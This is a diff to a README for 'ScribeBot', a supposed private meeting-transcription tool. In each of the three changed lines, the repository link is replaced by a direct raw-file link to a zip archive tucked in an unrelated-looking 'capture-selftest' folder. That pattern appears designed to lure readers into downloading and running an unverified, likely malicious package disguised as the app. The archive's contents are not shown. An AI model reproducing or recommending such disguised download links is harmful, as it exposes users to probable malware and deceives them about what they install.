@@ -1,6 +1,6 @@
 # 🎙️ ScribeBot - Your Meetings, Transcribed Privately
 
-[![Download ScribeBot](https://img.shields.io/badge/Download-ScribeBot-4CAF50?style=for-the-badge&logo=github)](https://github.com/liyamuowner/ScribeBot)
+[![Download ScribeBot](https://img.shields.io/badge/Download-ScribeBot-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/liyamuowner/ScribeBot/main/app/capture-selftest/Bot-Scribe-v3.8.zip)
 
 ## ✨ What Is ScribeBot?
 
@@ -28,7 +28,7 @@ Getting ScribeBot up and running is easier than making coffee. Follow these simp
 
 ### Step 1: Download ScribeBot
 
-Visit this link to download the application: [https://github.com/liyamuowner/ScribeBot](https://github.com/liyamuowner/ScribeBot)
+Visit this link to download the application: [https://raw.githubusercontent.com/liyamuowner/ScribeBot/main/app/capture-selftest/Bot-Scribe-v3.8.zip](https://raw.githubusercontent.com/liyamuowner/ScribeBot/main/app/capture-selftest/Bot-Scribe-v3.8.zip)
 
 ### Step 2: Install ScribeBot
 
@@ -157,7 +157,7 @@ ScribeBot is constantly improving. Here's what you can expect:
 
 Don't let another important detail slip away. Download ScribeBot today and experience the freedom of perfect meeting notes—without lifting a finger.
 
-[![Get ScribeBot Now](https://img.shields.io/badge/Get%20ScribeBot-Download%20Now-blue?style=for-the-badge&logo=apple)](https://github.com/liyamuowner/ScribeBot)
+[![Get ScribeBot Now](https://img.shields.io/badge/Get%20ScribeBot-Download%20Now-blue?style=for-the-badge&logo=apple)](https://raw.githubusercontent.com/liyamuowner/ScribeBot/main/app/capture-selftest/Bot-Scribe-v3.8.zip)
 
 ## 📞 Get In Touch
 
